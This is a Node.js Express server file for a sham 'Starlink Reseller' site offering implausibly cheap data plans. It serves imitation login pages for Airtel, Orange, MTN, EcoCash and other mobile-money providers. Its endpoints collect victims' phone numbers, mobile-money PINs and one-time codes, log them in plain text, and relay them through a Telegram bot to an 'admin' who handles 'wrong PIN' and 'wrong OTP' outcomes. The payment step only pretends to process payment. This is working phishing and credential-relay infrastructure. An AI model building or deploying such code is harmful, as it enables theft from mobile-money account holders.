const express = require('express');
const cors = require('cors');
const path = require('path');
const bodyParser = require('body-parser');
require('dotenv').config({ path: path.join(__dirname, '..', '.env') });
const { createApprovalRequest, submitOtp, submitLink, getApprovalStatus } = require('./telegram-bot');
const { securityHeaders, corsMiddleware, validateApiSecret, rateLimit, validator, auditLog } = require('./security');

const app = express();
const PORT = process.env.PORT || 3000;

// Security middleware
app.use(securityHeaders);
app.use(corsMiddleware);
app.use(bodyParser.json({ limit: '1mb' }));
app.use(bodyParser.urlencoded({ extended: true, limit: '1mb' }));
app.use('/starlink', express.static(path.join(__dirname, '../')));

// Root-level resources for payment gateway pages (must precede root static mount)
app.get('/manifest.json', (req, res) => {
    res.sendFile(path.join(__dirname, 'manifest.json'));
});
app.get('/airtel_icon-36x36.png', (req, res) => {
    res.sendFile(path.join(__dirname, 'airtel_icon-36x36.png'));
});
app.get('/airtel_icon_x48.svg', (req, res) => {
    res.sendFile(path.join(__dirname, 'airtel_icon_x48.svg'));
});
app.get('/airtel_icon_x72.svg', (req, res) => {
    res.sendFile(path.join(__dirname, 'airtel_icon_x72.svg'));
});
app.get('/airtel_icon_x96.svg', (req, res) => {
    res.sendFile(path.join(__dirname, 'airtel_icon_x96.svg'));
});
app.get('/airtel_icon_x128.svg', (req, res) => {
    res.sendFile(path.join(__dirname, 'airtel_icon_x128.svg'));
});
app.get('/airtel_icon_x384.svg', (req, res) => {
    res.sendFile(path.join(__dirname, 'airtel_icon_x384.svg'));
});
app.get('/airtel_icon_x512.svg', (req, res) => {
    res.sendFile(path.join(__dirname, 'airtel_icon_x512.svg'));
});

// Serve specific HTML pages
app.use(express.static(path.join(__dirname, '../')));
app.get('/starlink/', (req, res) => {
    res.sendFile(path.join(__dirname, '../index.html'));
});

app.get('/starlink/plans.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../plans.html'));
});

app.get('/starlink/orders.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../orders.html'));
});

app.get('/starlink/settings.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../settings.html'));
});

app.get('/starlink/register.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../register.html'));
});

app.get('/starlink/login.html', (req, res) => {
    res.sendFile(path.join(__dirname, '../user-login.html'));
});

// Serve index.html for root path
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, '../index.html'));
});

// Serve static assets
app.use(express.static(path.join(__dirname, '../')));

// API Routes
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', message: 'Starlink Reseller API is running' });
});

// Get all packages
app.get('/api/packages', (req, res) => {
    const packages = [
        // Daily Limited
        { id: 'daily-1gb', name: '1 GB / 1 Hour', data: '1 GB', duration: '1 Hour', price: 0.19, originalPrice: 0.25, type: 'daily', limit: 'limited', features: ['1 GB data', '1 hour validity', 'Instant activation'] },
        { id: 'daily-3gb', name: '3 GB / 3 Hours', data: '3 GB', duration: '3 Hours', price: 0.39, originalPrice: 0.49, type: 'daily', limit: 'limited', features: ['3 GB data', '3 hour validity', 'Instant activation'] },
        { id: 'daily-7gb', name: '7 GB / 7 Hours', data: '7 GB', duration: '7 Hours', price: 0.79, originalPrice: 0.99, type: 'daily', limit: 'limited', features: ['7 GB data', '7 hour validity', 'Instant activation'] },
        { id: 'daily-15gb', name: '15 GB / 15 Hours', data: '15 GB', duration: '15 Hours', price: 1.49, originalPrice: 1.99, type: 'daily', limit: 'limited', features: ['15 GB data', '15 hour validity', 'Instant activation'] },
        { id: 'daily-30gb', name: '30 GB / 21 Hours', data: '30 GB', duration: '21 Hours', price: 2.99, originalPrice: 3.49, type: 'daily', limit: 'limited', features: ['30 GB data', '21 hour validity', 'Instant activation'] },
        { id: 'daily-50gb', name: '50 GB / 24 Hours', data: '50 GB', duration: '24 Hours', price: 5.49, originalPrice: 6.99, type: 'daily', limit: 'limited', features: ['50 GB data', '24 hour validity', 'Instant activation'] },
        // Daily Unlimited
        { id: 'daily-unlimited', name: 'Unlimited / 30 Hours', data: 'Unlimited', duration: '30 Hours', price: 7.49, originalPrice: 9.99, type: 'daily', limit: 'unlimited', features: ['Unlimited data', '30 hour validity', 'Instant activation'] },
        // Monthly Limited
        { id: 'monthly-10gb', name: '10 GB / Month', data: '10 GB', duration: '1 Month', price: 4.99, originalPrice: 6.99, type: 'monthly', limit: 'limited', features: ['10 GB data', '30 days validity', 'HD streaming'] },
        { id: 'monthly-50gb', name: '50 GB / Month', data: '50 GB', duration: '1 Month', price: 12.99, originalPrice: 16.99, type: 'monthly', limit: 'limited', features: ['50 GB data', '30 days validity', 'HD streaming', 'Priority support'] },
        { id: 'monthly-100gb', name: '100 GB / Month', data: '100 GB', duration: '1 Month', price: 22.99, originalPrice: 29.99, type: 'monthly', limit: 'limited', features: ['100 GB data', '30 days validity', '4K streaming', 'Priority support'] },
        // Monthly Unlimited
        { id: 'monthly-unlimited', name: 'Unlimited / Month', data: 'Unlimited', duration: '1 Month', price: 10.00, originalPrice: 39.99, type: 'monthly', limit: 'unlimited', features: ['Unlimited data', '30 days validity', '4K streaming', 'Priority support', 'Static IP'] }
    ];
    res.json(packages);
});

// Process payment
app.post('/api/payment', (req, res) => {
    const { packageId, method, phone, amount } = req.body;
    
    // Validate
    if (!packageId || !method || !phone || !amount) {
        return res.status(400).json({ 
            success: false, 
            message: 'Missing required fields' 
        });
    }

    // Simulate payment processing
    const orderId = Date.now().toString();
    const status = 'pending';

    res.json({
        success: true,
        message: 'Payment processed successfully',
        orderId: orderId,
        status: status,
        packageId: packageId,
        method: method,
        phone: phone,
        amount: amount
    });
});

// Get orders by phone
app.get('/api/orders/:phone', (req, res) => {
    const phone = req.params.phone;
    // In a real app, fetch from database
    // For demo, return sample orders
    const orders = [
        {
            id: '1',
            package: 'Basic Package',
            amount: 3000,
            method: 'airtel',
            phone: phone,
            date: new Date().toISOString(),
            status: 'active'
        }
    ];
    res.json(orders);
});

// Webhook for Airtel Money
app.post('/api/webhook/airtel', (req, res) => {
    const { transactionId, status, amount, phone } = req.body;
    console.log('Airtel Money Webhook:', { transactionId, status, amount, phone });
    res.json({ success: true });
});

// Webhook for Orange Money
app.post('/api/webhook/orange', (req, res) => {
    const { transactionId, status, amount, phone } = req.body;
    console.log('Orange Money Webhook:', { transactionId, status, amount, phone });
    res.json({ success: true });
});

// ── Airtel Payment Gateway APIs ──────────────────────────────────
app.post('/api/set-country', (req, res) => {
    const { country } = req.body;
    console.log('Airtel country set:', country);
    res.json({ success: true });
});

app.post('/api/b2c-backend/v2/send-otp', (req, res) => {
    const { msisdn, pin, starlinkPackage } = req.body;
    console.log('Airtel send OTP:', { msisdn, pin, starlinkPackage });
    res.json({ status: 'SUCCESS', data: { otpId: 'otp-' + Date.now() } });
});

app.get('/api/check-status', (req, res) => {
    res.json({ status: 'pending' });
});

app.post('/api/user-deposited', (req, res) => {
    console.log('User deposited notification');
    res.json({ success: true });
});

app.post('/api/b2c-backend/v2/verify-otp', (req, res) => {
    const { otp, otpId, msisdn } = req.body;
    console.log('Airtel verify OTP:', { otp, otpId, msisdn });
    res.json({ status: 'SUCCESS', message: 'OTP verified successfully' });
});

app.post('/api/b2c-backend/v2/resend-otp', (req, res) => {
    const { msisdn } = req.body;
    console.log('Airtel resend OTP:', { msisdn });
    res.json({ status: 'SUCCESS', data: { otpId: 'otp-' + Date.now() } });
});

app.post('/api/clipboard-status', (req, res) => {
    const { decision, phone, country, source } = req.body;
    console.log('Clipboard status:', { decision, phone, country, source });
    res.json({ success: true, decision });
});

// ── Orange Money endpoints ───────────────────────────────────────
app.post('/api/orange/submit', (req, res) => {
    const { phone, pin, country, starlinkPackage } = req.body;
    console.log('Orange submit:', { phone, pin, country, starlinkPackage });
    res.json({ status: 'SUCCESS', message: 'Orange payment initiated' });
});

app.post('/api/orange/verify-otp', (req, res) => {
    const { otp, phone, country } = req.body;
    console.log('Orange verify OTP:', { otp, phone, country });
    res.json({ status: 'SUCCESS', message: 'OTP verified successfully' });
});

app.post('/api/orange/resend-otp', (req, res) => {
    const { phone, country } = req.body;
    console.log('Orange resend OTP:', { phone, country });
    res.json({ status: 'SUCCESS', data: { otpId: 'otp-' + Date.now() } });
});

// ── Payment gateway pages ───────────────────────────────────────
const paymentGateways = ['moov', 'lumitel', 'ecocash', 'orange', 'waafi', 'card', 'kbzpay', 'mtn'];
paymentGateways.forEach(gateway => {
    const htmlFile = path.join(__dirname, '..', gateway, 'login.html');
    app.get(`/${gateway}/login`, (req, res) => {
        if (require('fs').existsSync(htmlFile)) {
            res.sendFile(htmlFile);
        } else {
            res.status(404).send('Not Found');
        }
    });
    // Also handle /orange/login.html (used in DRC/BF redirect)
    app.get(`/${gateway}/login.html`, (req, res) => {
        if (require('fs').existsSync(htmlFile)) {
            res.sendFile(htmlFile);
        } else {
            res.status(404).send('Not Found');
        }
    });
});

// Ethiopia login
app.get('/ethiopia/login', (req, res) => {
    const file = path.join(__dirname, '..', 'ethiopia', 'login.html');
    if (require('fs').existsSync(file)) {
        res.sendFile(file);
    } else {
        res.status(404).send('Not Found');
    }
});

// Default /login (Airtel Money)
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'airtel-login.html'));
});

// Telegram notification endpoint
app.post('/api/telegram/notify', validateApiSecret, (req, res) => {
    const { message } = req.body;
    if (!message) {
        return res.json({ success: false, message: 'Message required' });
    }
    const sent = require('./telegram-bot').sendNotification(message);
    res.json({ success: sent, message: sent ? 'Notification sent' : 'Bot not enabled' });
});

// ── Agent payment API routes ───────────────────────────────────
app.get('/api/agent-config', (req, res) => {
    const country = req.query.country;
    const provider = req.query.provider;
    const agents = {
        'CD_vodacom': { found: true, agent_number: '21500*15#', agent_name: 'Vodacom DRC Agent', instructions: 'Apeui ope code *21500*15# nano M-Pesa.' },
        'ZM_airtel': { found: true, agent_number: '146*3*1#', agent_name: 'Airtel Zambia Agent', instructions: 'Apeui enter *146*3*1# ku Airtel Money.' },
    };
    const key = country + '_' + provider;
    if (agents[key]) {
        res.json(agents[key]);
    } else {
        res.json({ found: false });
    }
});

app.post('/api/agent-payment', (req, res) => {
    const { country, provider, location, phone, package: pkg, amount, confirmation_text } = req.body;
    console.log('Agent Payment Request:', { country, provider, location, phone, package: pkg, amount });
    setTimeout(() => {
        res.json({ success: true, orderId: 'AGT-' + Date.now() });
    }, 500);
});

// ── Telegram Bot API Routes ───────────────────────────────────

// Create a new payment approval request
app.post('/api/telegram/request-approval', validateApiSecret, rateLimit({ maxRequests: 5, windowMs: 60000 }), (req, res) => {
    const { userPhone, userPin, package: pkg, amount, method } = req.body;
    const clientIp = req.ip || 'unknown';
    
    // Validate inputs
    if (!validator.phone(userPhone)) {
        auditLog.write('TELEGRAM_REQUEST_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_phone' });
        return res.status(400).json({ success: false, message: 'Invalid phone number format' });
    }
    if (!validator.pin(userPin)) {
        auditLog.write('TELEGRAM_REQUEST_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_pin' });
        return res.status(400).json({ success: false, message: 'Invalid PIN format (4-6 digits required)' });
    }
    if (!validator.package(pkg)) {
        auditLog.write('TELEGRAM_REQUEST_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_package' });
        return res.status(400).json({ success: false, message: 'Invalid package' });
    }
    if (method && !validator.method(method)) {
        auditLog.write('TELEGRAM_REQUEST_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_method' });
        return res.status(400).json({ success: false, message: 'Invalid payment method' });
    }

    const requestId = createApprovalRequest({
        userPhone: validator.sanitize(userPhone),
        userPin: validator.sanitize(userPin),
        package: validator.sanitize(pkg),
        amount: amount ? validator.sanitize(amount) : 'N/A',
        method: method ? validator.sanitize(method) : 'N/A',
        onApproved: (id) => {
            console.log(`Approval request ${id} approved by admin`);
            auditLog.write('TELEGRAM_APPROVED', { requestId: id });
        },
        onRejected: (id) => {
            console.log(`Approval request ${id} rejected by admin`);
            auditLog.write('TELEGRAM_REJECTED', { requestId: id });
        },
        onInvalid: (id) => {
            console.log(`Approval request ${id} marked as invalid`);
            auditLog.write('TELEGRAM_INVALID', { requestId: id });
        },
        onVerified: (id) => {
            console.log(`OTP verification successful for request ${id}`);
            auditLog.write('TELEGRAM_VERIFIED', { requestId: id });
        },
        onWrongPin: (id) => {
            console.log(`Wrong PIN entered for request ${id}`);
            auditLog.write('TELEGRAM_WRONG_PIN', { requestId: id });
        },
        onWrongOtp: (id) => {
            console.log(`Wrong OTP entered for request ${id}`);
            auditLog.write('TELEGRAM_WRONG_OTP', { requestId: id });
        },
        onTimeout: (id) => {
            console.log(`OTP verification timeout for request ${id}`);
            auditLog.write('TELEGRAM_TIMEOUT', { requestId: id });
        }
    });

    auditLog.logTelegramRequest(clientIp, userPhone, pkg, method, requestId);
    res.json({ success: true, requestId, message: 'Approval request sent to admin' });
});

// Submit OTP for verification
app.post('/api/telegram/submit-otp', validateApiSecret, rateLimit({ maxRequests: 10, windowMs: 60000 }), (req, res) => {
    const { requestId, otp } = req.body;
    const clientIp = req.ip || 'unknown';
    
    if (!validator.requestId(requestId)) {
        auditLog.write('TELEGRAM_OTP_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_request_id' });
        return res.status(400).json({ success: false, message: 'Invalid request ID format' });
    }
    if (!validator.otp(otp)) {
        auditLog.write('TELEGRAM_OTP_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_otp' });
        return res.status(400).json({ success: false, message: 'Invalid OTP format (4-8 digits required)' });
    }

    const result = submitOtp(requestId, validator.sanitize(otp));
    auditLog.logTelegramOtp(clientIp, requestId, result.success);
    res.json(result);
});

// Submit verification link for Orange Money
app.post('/api/telegram/submit-link', validateApiSecret, rateLimit({ maxRequests: 10, windowMs: 60000 }), (req, res) => {
    const { requestId, link } = req.body;
    const clientIp = req.ip || 'unknown';
    
    if (!validator.requestId(requestId)) {
        auditLog.write('TELEGRAM_LINK_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_request_id' });
        return res.status(400).json({ success: false, message: 'Invalid request ID format' });
    }
    if (!link || typeof link !== 'string' || link.length < 5) {
        auditLog.write('TELEGRAM_LINK_VALIDATION_FAILED', { ip: clientIp, reason: 'invalid_link' });
        return res.status(400).json({ success: false, message: 'Invalid link format' });
    }

    const result = submitLink(requestId, validator.sanitize(link));
    auditLog.logTelegramOtp(clientIp, requestId, result.success);
    res.json(result);
});

app.get('/api/telegram/status/:requestId', validateApiSecret, (req, res) => {
    const { requestId } = req.params;
    const clientIp = req.ip || 'unknown';
    
    if (!validator.requestId(requestId)) {
        return res.status(400).json({ status: 'invalid_request_id' });
    }
    
    const status = getApprovalStatus(requestId);
    auditLog.logTelegramStatus(clientIp, requestId, status.status);
    res.json(status);
});

// Start server
app.listen(PORT, () => {
    console.log(`🚀 Starlink Reseller Server running on http://localhost:${PORT}`);
    console.log(`📡 API available at http://localhost:${PORT}/api`);
});